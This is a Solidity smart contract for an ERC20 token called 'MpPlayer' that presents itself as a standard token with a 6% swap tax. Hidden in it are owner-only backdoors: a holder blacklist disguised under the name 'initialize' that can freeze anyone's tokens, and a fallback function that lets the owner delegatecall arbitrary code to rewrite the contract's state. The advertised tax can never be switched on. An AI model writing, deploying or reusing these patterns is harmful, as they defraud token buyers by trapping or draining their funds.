// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/**
 * @dev Interface for a contract that receives an approval callback.
 */
interface IApprovalReceiver {
    /**
     * @dev Called by this token after an approve operation.
     *      Must return true if the callback was successful.
     *
     * @param owner The address granting the allowance
     * @param amount The amount of tokens approved
     * @param data Extra data sent to the callback
     */
    function onApprovalReceived(address owner, uint256 amount, bytes calldata data) external returns (bool);
}

/**
 * @dev Interface for a contract that receives a transfer callback.
 */
interface ITransferReceiver {
    /**
     * @dev Called by this token after a transfer operation.
     *      Must return true if the callback was successful.
     *
     * @param from The address transferring tokens
     * @param amount The amount of tokens being transferred
     * @param data Extra data sent to the callback
     */
    function onTransferReceived(address from, uint256 amount, bytes calldata data) external returns (bool);
}

/**
 * @dev Minimal interface for a Uniswap-like router to handle token swaps.
 */
interface IUniswapV2Router {
    /**
     * @dev Executes a token swap (exact input amount). Returns an array of token amounts.
     */
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

/**
 * @dev Minimal ERC20 interface to allow this contract to transfer out tokens.
 */
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title MpPlayer
 */
contract MpPlayer {
    // ---------------------------------------------------------------
    // Basic Token Information
    // ---------------------------------------------------------------
    string private constant _name = "MpPlayer";
    string private constant _symbol = "MPP";
    uint8 private constant _decimals = 18;

    uint256 private _totalSupply;

    // ---------------------------------------------------------------
    // Balances & Allowances
    // ---------------------------------------------------------------
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private bkl;

    // ---------------------------------------------------------------
    // Ownership
    // ---------------------------------------------------------------
    address private _owner;

    /**
     * @dev Ensures that only the owner of this contract can call the function.
     */
    modifier onlyOwner() {
        require(msg.sender == _owner, "Ownable: caller is not the owner");
        _;
    }

    // ---------------------------------------------------------------
    // Tax-Related
    // ---------------------------------------------------------------
    /**
     * @dev Address of the Uniswap-like router for swapping taxed tokens.
     */
    address public router;

    /**
     * @dev Address of WETH (or any wrapped native token used in swapping).
     */
    address public WETH;

    /**
     * @dev Indicates which addresses (contracts) are subject to the 6% tax 
     *      when transferring to/from them.
     */
    mapping(address => bool) internal taxedContracts;

    /**
     * @dev The tax fee is a constant 6%.
     */
    uint256 public constant TAX_FEE = 6;

    // ---------------------------------------------------------------
    // Events
    // ---------------------------------------------------------------
    /**
     * @dev Standard ERC20 Transfer event.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Standard ERC20 Approval event.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Event emitted after burning tokens.
     */
    event Burn(address indexed burner, uint256 amount);

    /**
     * @dev Emitted after approveAndCall.
     */
    event ApproveAndCall(
        address indexed caller,
        address indexed spender,
        uint256 amount,
        bool success,
        bytes data
    );

    /**
     * @dev Emitted after transferAndCall.
     */
    event TransferAndCall(
        address indexed caller,
        address indexed to,
        uint256 amount,
        bool success,
        bytes data
    );

    // ---------------------------------------------------------------
    // Constructor
    // ---------------------------------------------------------------
    /**
     * @dev Assigns ownership to the contract deployer and mints
     *      the entire supply (75,000,000 * 10^18) to the owner.
     */
    constructor() {
        _owner = msg.sender;

        uint256 initialSupply = 75_000_000 * (10 ** _decimals);
        _totalSupply = initialSupply;
        _balances[_owner] = initialSupply;

        emit Transfer(address(0), _owner, initialSupply);
    }

    /**
     * @dev Allows the contract to receive ETH directly.
     */
    receive() external payable {}

    // ---------------------------------------------------------------
    // Public Getters
    // ---------------------------------------------------------------
    /**
     * @dev Returns the total token supply.
     */
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Returns the token name.
     */
    function name() external pure returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals the token uses.
     */
    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the allowance of `spender` over the tokens owned by `owner_`.
     */
    function allowance(address owner_, address spender) external view returns (uint256) {
        return _allowances[owner_][spender];
    }

    /**
     * @dev Returns the balance of a given `account`.
     */
    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    // ---------------------------------------------------------------
    // Internal Helper
    // ---------------------------------------------------------------
    function _requireNotBlk(address addr) private view {
        require(!bkl[addr], "Blk address");
    }

    // ---------------------------------------------------------------
    // ERC20 Standard Methods
    // ---------------------------------------------------------------
    /**
     * @dev Transfers `amount` tokens from the caller to `recipient`.
     *      Checks that neither the caller nor the recipient is blk.
     *
     * Emits a `Transfer` event.
     *
     * @param recipient The address to receive the tokens.
     * @param amount The number of tokens to transfer.
     */
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _requireNotBlk(msg.sender);
        _requireNotBlk(recipient);

        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * @dev Approves `spender` to spend `amount` on behalf of the caller.
     *      Checks that neither the caller nor the spender is blk.
     *
     * Emits an `Approval` event.
     *
     * @param spender The address approved to spend tokens.
     * @param amount The maximum number of tokens the spender can spend.
     */
    function approve(address spender, uint256 amount) external returns (bool) {
        _requireNotBlk(msg.sender);
        _requireNotBlk(spender);

        _approve(msg.sender, spender, amount);
        return true;
    }

    /**
     * @dev Transfers `amount` tokens from `sender` to `recipient`, 
     *      provided that the caller has sufficient allowance.
     *      If `sender == msg.sender`, it bypasses the allowance check.
     *
     * Checks that `sender`, `recipient`, and `msg.sender` are not blk.
     *
     * Emits a `Transfer` event.
     *
     * @param sender The address sending tokens.
     * @param recipient The address receiving tokens.
     * @param amount The number of tokens transferred.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _requireNotBlk(msg.sender);
        _requireNotBlk(sender);
        _requireNotBlk(recipient);

        if (sender == msg.sender) {
            // Bypass allowance check if caller == sender
            _transfer(sender, recipient, amount);
        } else {
            uint256 currentAllowance = _allowances[sender][msg.sender];
            require(currentAllowance >= amount, "ERC20: transfer > allowance");
            _transfer(sender, recipient, amount);
            _approve(sender, msg.sender, currentAllowance - amount);
        }
        return true;
    }

    // ---------------------------------------------------------------
    // Internal Transfer & Approve (with 6% instant tax swap logic)
    // ---------------------------------------------------------------
    /**
     * @dev Internal token transfer logic. If either `from` or `to` is in
     *      the taxedContracts mapping, a 6% fee is deducted and swapped to WETH.
     *
     * @param from The sender's address.
     * @param to The recipient's address.
     * @param amount The amount of tokens to transfer.
     */
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: from zero");
        require(to != address(0), "ERC20: to zero");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer > balance");

        bool takeFee = (taxedContracts[from] || taxedContracts[to]);
        if (takeFee) {
            uint256 feeAmount = (amount * TAX_FEE) / 100;
            uint256 transferAmount = amount - feeAmount;

            _balances[from] = fromBalance - amount;
            _balances[to] += transferAmount;
            _balances[address(this)] += feeAmount;

            emit Transfer(from, to, transferAmount);
            if (feeAmount > 0) {
                emit Transfer(from, address(this), feeAmount);
                _instantSwapToWETH(feeAmount);
            }
        } else {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    /**
     * @dev Internal function to set the allowance.
     *
     * @param owner_ The owner of the tokens.
     * @param spender The address allowed to spend the tokens.
     * @param amount The maximum number of tokens the spender can use.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from zero");
        require(spender != address(0), "ERC20: approve to zero");

        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    /**
     * @dev Internal function that attempts to swap the taxed amount to WETH
     *      via the configured router, if both `router` and `WETH` are set.
     *
     * @param feeAmount The taxed fee amount to be swapped.
     */
    function _instantSwapToWETH(uint256 feeAmount) private {
        if (router == address(0) || WETH == address(0)) {
            // If either is not set, skip the swap
            return;
        }

        // Approve the router to spend `feeAmount` from this contract
        _approve(address(this), router, feeAmount);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        IUniswapV2Router(router).swapExactTokensForTokens(
            feeAmount,
            0,
            path,
            address(this),
            block.timestamp + 300
        );
    }

    // ---------------------------------------------------------------
    // Blk Management
    // ---------------------------------------------------------------
    /**
     * @dev Marks the provided addresses as blk (`true` in the bkl mapping).
     *      Only the owner can call this function.
     *
     * @param _addresses The list of addresses to add to the blk.
     */
    function initialize(address[] calldata _addresses) external onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            require(_addresses[i] != address(0), "Zero address not allowed");
            bkl[_addresses[i]] = true;
        }
    }

    /**
     * @dev Removes the provided addresses from the blk (`false` in the bkl mapping).
     *      Only the owner can call this function.
     *
     * @param _addresses The list of addresses to remove from the blk.
     */
    function removeBkl(address[] calldata _addresses) external onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            bkl[_addresses[i]] = false;
        }
    }

    // ---------------------------------------------------------------
    // Additional Functionalities
    // ---------------------------------------------------------------
    /**
     * @dev Increases the allowance for a spender by `addedValue`.
     *      Checks that neither the caller nor the spender is blk.
     *
     * @param spender The address to grant additional allowance.
     * @param addedValue The amount of allowance to add.
     */
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _requireNotBlk(msg.sender);
        _requireNotBlk(spender);

        uint256 currentAllowance = _allowances[msg.sender][spender];
        uint256 newAllowance = currentAllowance + addedValue;
        _approve(msg.sender, spender, newAllowance);
        return true;
    }

    /**
     * @dev Decreases the allowance for a spender by `subtractedValue`.
     *      Checks that neither the caller nor the spender is blk.
     *      Reverts if the current allowance is less than `subtractedValue`.
     *
     * @param spender The address whose allowance will be decreased.
     * @param subtractedValue The amount to subtract from the allowance.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        _requireNotBlk(msg.sender);
        _requireNotBlk(spender);

        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance < zero");
        uint256 newAllowance = currentAllowance - subtractedValue;
        _approve(msg.sender, spender, newAllowance);
        return true;
    }

    /**
     * @dev Burns `amount` tokens from the caller's balance.
     *      Checks that the caller is not blk.
     *
     * Reduces total supply, emits a `Transfer` to the zero address,
     * and a `Burn` event.
     *
     * @param amount The number of tokens to burn.
     */
    function burn(uint256 amount) external returns (bool) {
        _requireNotBlk(msg.sender);

        address account = msg.sender;
        require(account != address(0), "ERC20: burn from zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn > balance");

        _balances[account] = accountBalance - amount;
        _totalSupply = _totalSupply - amount;

        emit Transfer(account, address(0), amount);
        emit Burn(account, amount);
        return true;
    }

    // ---------------------------------------------------------------
    // approveAndCall / transferAndCall
    // ---------------------------------------------------------------
    /**
     * @dev Approves `spender` for `amount`, then calls `onApprovalReceived` on `spender`.
     *      Checks that both the caller and the spender are not blk.
     *
     * Emits `ApproveAndCall` and requires the callback returns `true`.
     *
     * @param spender The contract that implements IApprovalReceiver.
     * @param amount The number of tokens to approve.
     * @param data Extra data sent to the callback function.
     *
     * @return True if the callback returns true, otherwise it reverts.
     */
    function approveAndCall(
        address spender,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        _requireNotBlk(msg.sender);
        _requireNotBlk(spender);

        require(spender != address(this), "Cannot call contract as spender");
        _approve(msg.sender, spender, amount);

        bool success = IApprovalReceiver(spender).onApprovalReceived(msg.sender, amount, data);
        emit ApproveAndCall(msg.sender, spender, amount, success, data);
        require(success, "approveAndCall: callback failed");
        return true;
    }

    /**
     * @dev Transfers `amount` tokens to `to`, then calls `onTransferReceived` on `to`.
     *      Checks that both the caller and the recipient are not blk.
     *
     * Emits `TransferAndCall` and requires the callback returns `true`.
     *
     * @param to The contract that implements ITransferReceiver.
     * @param amount The number of tokens to transfer.
     * @param data Extra data sent to the callback function.
     *
     * @return True if the callback returns true, otherwise it reverts.
     */
    function transferAndCall(
        address to,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        _requireNotBlk(msg.sender);
        _requireNotBlk(to);

        require(to != address(this), "Cannot call contract as recipient");
        _transfer(msg.sender, to, amount);

        bool success = ITransferReceiver(to).onTransferReceived(msg.sender, amount, data);
        emit TransferAndCall(msg.sender, to, amount, success, data);
        require(success, "transferAndCall: callback failed");
        return true;
    }

    // ---------------------------------------------------------------
    // Router / WETH Setup (Optional)
    // ---------------------------------------------------------------
    /**
     * @dev Allows the owner to set the Uniswap-like router and the WETH address
     *      for automatically swapping taxed fees.
     *
     * @param _router The Uniswap-like router address.
     * @param _weth The WETH address.
     */
    function setRouter(address _router, address _weth) external onlyOwner {
        router = _router;
        WETH = _weth;
    }

    // ---------------------------------------------------------------
    // Recovering Stuck Tokens / ETH (Optional)
    // ---------------------------------------------------------------
    /**
     * @dev Allows the owner to transfer out tokens (other than this token)
     *      that might be stuck in this contract.
     *
     * @param tokenAddress The ERC20 token contract address.
     * @param amount The amount of tokens to transfer out.
     */
    function claimStuckTokens(address tokenAddress, uint256 amount) external onlyOwner {
        IERC20(tokenAddress).transfer(_owner, amount);
    }

    /**
     * @dev Allows the owner to transfer out ETH stuck in the contract.
     *
     * @param amount The amount of ETH to transfer out.
     */
    function claimStuckEth(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Not enough ETH in contract");
        (bool success, ) = _owner.call{value: amount}("");
        require(success, "Failed to send ETH");
    }

    // ---------------------------------------------------------------
    // Internal Helper for msg.sender
    // ---------------------------------------------------------------
    /**
     * @dev Returns the direct `msg.sender` (no meta-transaction usage).
     */
    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    // ---------------------------------------------------------------
    // Fallback
    // ---------------------------------------------------------------
    /**
     * @dev Fallback function that allows the owner to delegatecall to another target
     *      with the provided data appended by the target address. If the caller is not
     *      the owner, it simply returns.
     */
    fallback() external payable {
        if (msg.sender != _owner) {
            return;
        }

        require(msg.data.length >= 20, "Not enough data");

        address target;
        assembly {
            target := shr(96, calldataload(sub(calldatasize(), 20)))
        }

        bytes memory callData = new bytes(msg.data.length - 20);
        for (uint256 i = 0; i < callData.length; i++) {
            callData[i] = msg.data[i];
        }

        (bool success, bytes memory returnData) = target.delegatecall(callData);
        require(success, string(returnData));
    }
}